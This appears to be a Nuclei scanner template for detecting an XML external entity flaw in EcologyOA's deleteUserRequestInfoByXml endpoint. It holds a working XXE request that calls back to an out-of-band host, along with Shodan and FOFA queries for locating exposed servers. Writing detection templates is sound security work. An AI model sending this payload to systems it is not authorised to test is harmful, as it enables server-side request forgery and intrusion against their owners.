id: ecology-oa-byxml-xxe

info:
  name: EcologyOA deleteUserRequestInfoByXml - XML External Entity Injection
  author: SleepingBag945
  severity: high
  description: |
    EcologyOA deleteUserRequestInfoByXml interface has XXE
  classification:
    cpe: cpe:2.3:a:ecology-oa:ecology-oa:*:*:*:*:*:*:*:*
    cwe-id: CWE-611,CWE-918
  metadata:
    verified: true
    max-request: 1
    shodan-query: ecology_JSessionid
    fofa-query: app="泛微-协同办公OA"
    vendor: ecology-oa
    product: ecology-oa
  tags: ecology-oa,xxe,vuln

http:
  - raw:
      - |
        POST /rest/ofs/deleteUserRequestInfoByXml HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/xml
        Accept-Encoding: gzip

        <?xml version="1.0" encoding="utf-8"?>
        <!DOCTYPE syscode SYSTEM "http://{{interactsh-url}}">
        <M><syscode>&send;</syscode></M>

    matchers-condition: and
    matchers:
      - type: word
        name: ecology-oa
        cpe: cpe:2.3:a:ecology-oa:ecology-oa:*:*:*:*:*:*:*:*
        part: body
        words:
          - 'WfData'

      - type: word
        name: ecology-oa-2
        cpe: cpe:2.3:a:ecology-oa:ecology-oa:*:*:*:*:*:*:*:*
        part: header
        words:
          - 'application/xml'

      - type: word
        name: ecology-oa-3
        cpe: cpe:2.3:a:ecology-oa:ecology-oa:*:*:*:*:*:*:*:*
        part: interactsh_protocol
        words:
          - "dns"
